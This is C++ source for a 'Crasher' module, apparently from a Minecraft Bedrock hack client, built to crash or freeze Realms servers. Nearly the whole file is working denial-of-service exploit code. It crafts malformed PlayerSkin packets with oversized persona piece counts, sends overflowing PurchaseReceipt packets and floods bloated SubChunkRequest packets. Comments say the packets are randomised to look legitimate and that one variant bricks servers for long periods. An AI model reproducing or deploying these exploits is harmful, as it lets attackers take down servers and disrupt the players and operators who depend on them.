#include "Crasher.h"

Crasher::Crasher() : IModule(0, Category::MISC, "Crash or freeze realms servers") {

	this->registerEnumSetting("Crash type", &this->selectedCrashType, static_cast<int32_t>(CrashType::PERSONA_PIECE_OVERFLOW));

#ifdef HORION_DEBUG
	this->selectedCrashType.addEntry({"Type 1", static_cast<int32_t>(CrashType::MOVEMENT_PACKET)}); // deprecated
	this->selectedCrashType.addEntry({"Type 2", static_cast<int32_t>(CrashType::PURCHASE_RECEIPT_OVERFLOW)}); // deprecated
	this->selectedCrashType.addEntry({"Type 3", static_cast<int32_t>(CrashType::BLOATED_SUBCHUNK_REQUEST)});
	this->selectedCrashType.addEntry({"TEST", static_cast<int32_t>(CrashType::TEST)});
#endif
	this->selectedCrashType.addEntry({"Type 4", static_cast<int32_t>(CrashType::PERSONA_PIECE_OVERFLOW)});
	this->selectedCrashType.addEntry({"Freeze", static_cast<int32_t>(CrashType::FREEZE)});
}

const char* Crasher::getModuleName() {
	return "Crasher";
}

void Crasher::onSendPacket(Packet* packet) {
	if (!Game.getLocalPlayer()) {
		this->setEnabled(false);
		return;
	}

#ifdef HORION_DEBUG
	if (this->getCrashType() == CrashType::MOVEMENT_PACKET) {
		auto id = packet->getId();
		if (id == PacketID::PlayerAuthInput) {
			auto& inputPkt = *reinterpret_cast<PlayerAuthInputPacket*>(packet);
			inputPkt.pos = {MAGIC_MOVEMENT_PKT_NUM, MAGIC_MOVEMENT_PKT_NUM, MAGIC_MOVEMENT_PKT_NUM};
		}
		else if (id == PacketID::MovePlayer) {
			auto& movePkt = *reinterpret_cast<MovePlayerPacket*>(packet);
			movePkt.Position = {MAGIC_MOVEMENT_PKT_NUM, MAGIC_MOVEMENT_PKT_NUM, MAGIC_MOVEMENT_PKT_NUM};
		}
	}
#endif
}

void Crasher::onTick(GameMode* gm) {
	auto lp = Game.getLocalPlayer();
	if (!lp) {
		this->setEnabled(false);
		return;
	}

	auto& netHandler = *Game.getNetworkHandler();
	static BinaryStream bs{};

	switch (this->getCrashType()) {
#ifdef HORION_DEBUG
	case CrashType::PURCHASE_RECEIPT_OVERFLOW: {
		bs.reset();
		bs.prependPacketHeaderMetadata(PacketID::PurchaseReceipt);
		bs.writeUnsignedVarInt((std::numeric_limits<uint32_t>::max)());
		netHandler.sendRawBinaryStreamToServer(bs, PacketID::PurchaseReceipt);
		break;
	}
	case CrashType::BLOATED_SUBCHUNK_REQUEST: {
		int32_t dimIdOut = lp->getDimensionId();
		Vec3i bp(
			Utils::generateRandomInt<int32_t>(),
			Utils::generateRandomInt<int32_t>(),
			Utils::generateRandomInt<int32_t>()
		);

		bs.reset();
		bs.prependPacketHeaderMetadata(PacketID::SubChunkRequest);
		bs.writeVarInt(dimIdOut);
		bs.writeVarInt(bp.x);
		bs.writeVarInt(bp.y);
		bs.writeVarInt(bp.z);
		bs.writeUnsignedInt((std::numeric_limits<uint32_t>::max)());

		// 100 packets/tick is completely arbitrary here
		// we just want the server to read as many of these bloated packets in the least amount of time
		// warning: this exploit seems extremely dangerous in that it completely bricks the server for an extended period of time
		// the server builds up more and more memory but doesn't actually appear to crash
		// (unlike the other methods where an instant crash causes an immediate server rollback)
		for (int32_t i = 0; i < 100; i++) {
			netHandler.sendRawBinaryStreamToServer(bs, PacketID::SubChunkRequest);
		}
		break;
	}
	case CrashType::TEST: {
		break;
	}
#endif
	case CrashType::PERSONA_PIECE_OVERFLOW:
	case CrashType::FREEZE: {  // make this packet is random as possible

		static char SKIN_BUF_32[32 * 32 * 4], SKIN_BUF_64[64 * 64 * 4], SKIN_BUF_128[128 * 128 * 4];
		static bool bufInit = false;
		if (!bufInit) {
			constexpr auto fillRandomBuf = [](char* data, size_t len) -> void {
				for (size_t i = 0; i < len; ++i) {
					data[i] = static_cast<char>(Utils::generateRandomInt<int32_t>(0, 127));
				}
			};
			fillRandomBuf(SKIN_BUF_32, sizeof(SKIN_BUF_32));
			fillRandomBuf(SKIN_BUF_64, sizeof(SKIN_BUF_64)); // the actual skin data appears to be a string full of unsigned chars (rgba), a 64x64 skin would be 64 x 64 x 4 channels = 16384 buffer
			fillRandomBuf(SKIN_BUF_128, sizeof(SKIN_BUF_128));
			bufInit = true;
		}

		bool isFreeze = (this->getCrashType() == CrashType::FREEZE);
		int32_t crashPlaceInPacket = Utils::generateRandomInt<int32_t>(1, 2); // whether to crash at persona uv anim size or persona piece count

		bool isPremiumFlag = (Utils::generateRandomInt<int32_t>(0, 1) == 1);
		bool isPersonaFlag = (Utils::generateRandomInt<int32_t>(0, 1) == 1);

		// randomize when we give player a cape or not
		auto skinId = Utils::generateGuid();
		bool hasCape = (Utils::generateRandomInt<int32_t>(0, 1) == 1);
		std::string fullSkinId = (hasCape ? (skinId + Utils::generateGuid()) : skinId);






		// https://github.com/Sandertv/gophertunnel/blob/37348c042c8671b3a6e6414a9656d8fa5b615354/minecraft/protocol/skin.go#L75
		// PlayerSkinPacket::write
		bs.reset();
		bs.prependPacketHeaderMetadata(PacketID::PlayerSkin);
		bs.writeUnsignedInt64(Utils::generateRandomInt<uint64_t>()); // mce::uuid most significant bits
		bs.writeUnsignedInt64(Utils::generateRandomInt<uint64_t>()); // mce::uuid least significant bits
		bs.writeString(skinId); // skin id
		bs.writeString(Utils::generateGuid()); // playfab id
		bs.writeString(Utils::base64_encode(xorstr_(R"({
   "geometry" : {
      "default" : "geometry.humanoid.custom"
   }
})"
		))); // skin resource patch, bds DOES use base64 (NOT base64 url) decoding to extract this

		if (isFreeze) {
			bs.writeUnsignedInt(32);  // skin image width
			bs.writeUnsignedInt(32);  // skin image height
			bs.writeString(SKIN_BUF_32); // you can't even load 32x32 skins but i make the skin size smaller to make the packet size indistinguishable from legit skin packets
		}
		else if (Utils::generateRandomInt<int32_t>(0, 1) == 1) {
			bs.writeUnsignedInt(64);
			bs.writeUnsignedInt(64);
			bs.writeString(SKIN_BUF_64);
		}
		else { // 128x128 skin
			bs.writeUnsignedInt(128);
			bs.writeUnsignedInt(128);
			bs.writeString(SKIN_BUF_128);
		}

		if (!isFreeze && (crashPlaceInPacket == 1)) {
			constexpr uint32_t bufMin1 = static_cast<uint32_t>((std::numeric_limits<int32_t>::max)());
			constexpr uint32_t bufMax1 = (std::numeric_limits<uint32_t>::max)();
			uint32_t range1 = Utils::generateRandomInt<uint32_t>(bufMin1, bufMax1);
			bs.writeUnsignedInt(range1);  // persona animation uv size, crash place #1
		} 
		else {
			bs.writeUnsignedInt(0x0);
		}

		bs.writeUnsignedInt(0); // cape width
		bs.writeUnsignedInt(0); // cape height
		bs.writeString(Utils::base64_encode("")); // cape data (empty), bds DOES use base64 (NOT base64 url) decoding to extract this
		bs.writeString(Utils::base64_encode("")); // geometry data (don't feel like filling this in), bds DOES use base64 (NOT base64 url) decoding to extract this
		bs.writeString(""); // geometry version or something? idk
		bs.writeString(""); // persona animation data bloat idk
		bs.writeString(""); // cape id, but we got no cape!
		bs.writeString(fullSkinId);  // full skin id, same as skin id if no cape
		bs.writeString("wide"); // skin arm size
		bs.writeString(""); // persona skin color

		if (isFreeze) {
			// doesnt cause crash but just bricks server as long as ur in it lol
			// now this packet is small enough to not increase server memory and not big enough to crash
			constexpr uint32_t size = (std::numeric_limits<uint16_t>::max)() + (std::numeric_limits<uint16_t>::max)();
			bs.writeUnsignedInt(size);
		}
		else if (crashPlaceInPacket == 2) {
			constexpr uint32_t bufMin2 = static_cast<uint32_t>((std::numeric_limits<int32_t>::max)());
			constexpr uint32_t bufMax2 = (std::numeric_limits<uint32_t>::max)();
			uint32_t range2 = Utils::generateRandomInt<uint32_t>(bufMin2, bufMax2);
			bs.writeUnsignedInt(range2); // persona piece count... crash place #2
		}

		bs.writeUnsignedInt(0x0); // persona piece tint color count
		bs.writeBool(isPremiumFlag); // is premium
		bs.writeBool(isPersonaFlag);  // is persona
		bs.writeBool(hasCape);  // is cape on classic skin
		bs.writeBool(true);	// primary user?
		bs.writeString(""); // localized new skin name, this seems to be deprecated
		bs.writeString(""); // localized old skin name, this seems to be deprecated
		bs.writeBool(true); // is trusted

		netHandler.sendRawBinaryStreamToServer(bs, PacketID::PlayerSkin);
		break;
	}
	default:
		break;
	}
}